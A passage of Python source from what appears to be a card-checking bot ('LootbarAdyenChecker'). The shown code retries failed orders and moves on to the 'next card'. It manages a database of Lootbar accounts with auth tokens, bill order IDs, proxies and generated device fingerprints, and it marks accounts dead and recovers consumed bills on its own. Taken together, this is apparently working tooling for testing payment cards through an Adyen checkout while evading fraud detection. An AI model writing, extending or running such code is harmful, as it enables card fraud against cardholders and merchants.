                    account.fail_count = max(0, account.fail_count - 1)
                    return classification, details

                except _OrderConsumedError as e:
                    old_bill = account.bill_order_id
                    if old_bill:
                        self._dead_bills.add(old_bill)
                    account.market_pay_id = None
                    account.bill_order_id = ""
                    logger.warning(f"[LOOTBAR:{account.label}] Bill {old_bill} consumed: {e}. Auto-recovering...")
                    if attempt < max_retries - 1:
                        continue
                    account.is_dead = True
                    return 'error', f"Bill dead ({account.label}): Could not auto-recover. Provide fresh bill via /lbcookie"

                except Exception as e:
                    err_msg = str(e)
                    account.market_pay_id = None
                    if 'BILL_EXPIRED' in err_msg:
                        account.bill_order_id = ""
                        if attempt < max_retries - 1:
                            logger.warning(f"[LOOTBAR:{account.label}] Bill expired, auto-recovering...")
                            continue
                        account.is_dead = True
                        return 'error', f"Bill expired ({account.label}): Update via /lbcookie with a fresh bill_order_id"
                    if 'NETWORK_ERROR' in err_msg:
                        account.fail_count += 1
                        return 'error', f"Network error ({account.label}): Will retry next card"
                    account.fail_count += 1
                    if account.fail_count >= 5:
                        account.is_dead = True
                        logger.warning(f"[LOOTBAR:{account.label}] Marked dead after 5 failures")
                    return 'error', f"Order failed ({account.label}): {err_msg[:80]}"

            return 'error', f"All retries exhausted ({account.label})"

        except Exception as e:
            if account:
                account.fail_count += 1
            return 'error', f"Check failed: {str(e)[:60]}"
        finally:
            if session and not session.closed:
                await session.close()

    def get_alive_count(self) -> int:
        return sum(1 for a in self._accounts if not a.is_dead)

    def get_total_count(self) -> int:
        return len(self._accounts)

    async def reset_all(self):
        for a in self._accounts:
            a.market_pay_id = None
            a.check_count = 0
            a.fail_count = 0
            a.is_dead = False


async def db_create_lootbar_table(db_pool) -> None:
    try:
        async with db_pool.acquire(timeout=10) as conn:
            await conn.execute('''
                CREATE TABLE IF NOT EXISTS lootbar_accounts (
                    id SERIAL PRIMARY KEY,
                    user_id BIGINT NOT NULL,
                    auth_token TEXT NOT NULL,
                    bill_order_id TEXT DEFAULT '',
                    proxy TEXT DEFAULT '',
                    fingerprint JSONB,
                    label TEXT DEFAULT '',
                    is_active BOOLEAN DEFAULT TRUE,
                    created_at TIMESTAMP DEFAULT NOW(),
                    UNIQUE(user_id, auth_token)
                )
            ''')
            await conn.execute("CREATE INDEX IF NOT EXISTS lb_acc_user_idx ON lootbar_accounts(user_id)")
    except Exception as e:
        logger.error(f"[LOOTBAR] Failed to create table: {e}")


async def db_add_lootbar_account(db_pool, user_id: int, auth_token: str,
                                  bill_order_id: str = "", proxy: str = "",
                                  label: str = "") -> Tuple[bool, str]:
    try:
        fp = _generate_device_fingerprint(auth_token)
        async with db_pool.acquire(timeout=10) as conn:
            await conn.execute('''
                INSERT INTO lootbar_accounts (user_id, auth_token, bill_order_id, proxy, fingerprint, label)
                VALUES ($1, $2, $3, $4, $5::jsonb, $6)
                ON CONFLICT (user_id, auth_token) DO UPDATE
                SET bill_order_id = EXCLUDED.bill_order_id,
                    proxy = EXCLUDED.proxy,
                    fingerprint = EXCLUDED.fingerprint,
                    label = EXCLUDED.label,
                    is_active = TRUE
            ''', user_id, auth_token, bill_order_id, proxy, json.dumps(fp), label)
        return True, "Account added"
    except Exception as e:
        return False, str(e)


async def db_get_lootbar_accounts(db_pool, user_id: int) -> List[dict]:
    try:
        async with db_pool.acquire(timeout=10) as conn:
            rows = await conn.fetch(
                "SELECT id, auth_token, bill_order_id, proxy, fingerprint, label, is_active "
                "FROM lootbar_accounts WHERE user_id = $1 AND is_active = TRUE ORDER BY id",
                user_id
            )
            results = []
            for row in rows:
                fp = row['fingerprint']
                if isinstance(fp, str):
                    fp = json.loads(fp)
                results.append({
                    "id": row['id'],
                    "auth_token": row['auth_token'],
                    "bill_order_id": row['bill_order_id'] or '',
                    "proxy": row['proxy'] or '',
                    "fingerprint": fp,
                    "label": row['label'] or f"acc_{row['id']}",
                    "is_active": row['is_active'],
                })
            return results
    except Exception as e:
        logger.error(f"[LOOTBAR] Failed to get accounts: {e}")
        return []


async def db_remove_lootbar_account(db_pool, user_id: int, account_id: int) -> bool:
    try:
        async with db_pool.acquire(timeout=10) as conn:
            result = await conn.execute(
                "UPDATE lootbar_accounts SET is_active = FALSE WHERE id = $1 AND user_id = $2",
                account_id, user_id
            )
            return "UPDATE 1" in result
    except Exception as e:
        logger.error(f"[LOOTBAR] Failed to remove account: {e}")
        return False


async def db_update_lootbar_bill(db_pool, user_id: int, account_id: int, bill_order_id: str) -> bool:
    try:
        async with db_pool.acquire(timeout=10) as conn:
            result = await conn.execute(
                "UPDATE lootbar_accounts SET bill_order_id = $1 WHERE id = $2 AND user_id = $3 AND is_active = TRUE",
                bill_order_id, account_id, user_id
            )
            return "UPDATE 1" in result
    except Exception as e:
        logger.error(f"[LOOTBAR] Failed to update bill: {e}")
        return False


async def db_update_all_lootbar_bills(db_pool, user_id: int, bill_order_id: str) -> int:
    try:
        async with db_pool.acquire(timeout=10) as conn:
            result = await conn.execute(
                "UPDATE lootbar_accounts SET bill_order_id = $1 WHERE user_id = $2 AND is_active = TRUE",
                bill_order_id, user_id
            )
            count = int(result.split()[-1]) if result else 0
            return count
    except Exception as e:
        logger.error(f"[LOOTBAR] Failed to update bills: {e}")
        return 0


async def db_clear_lootbar_accounts(db_pool, user_id: int) -> int:
    try:
        async with db_pool.acquire(timeout=10) as conn:
            result = await conn.execute(
                "UPDATE lootbar_accounts SET is_active = FALSE WHERE user_id = $1 AND is_active = TRUE",
                user_id
            )
            count = int(result.split()[-1]) if result else 0
            return count
    except Exception as e:
        logger.error(f"[LOOTBAR] Failed to clear accounts: {e}")
        return 0


def build_checker_from_db_accounts(db_accounts: List[dict]) -> LootbarAdyenChecker:
    accounts = []
    for acc in db_accounts:
        accounts.append(LootbarAccount(
            auth_token=acc['auth_token'],
            bill_order_id=acc.get('bill_order_id', ''),
            proxy=acc.get('proxy', ''),
            fingerprint=acc.get('fingerprint'),
            label=acc.get('label', ''),
            account_id=acc.get('id', 0),
        ))
    return LootbarAdyenChecker(accounts=accounts)
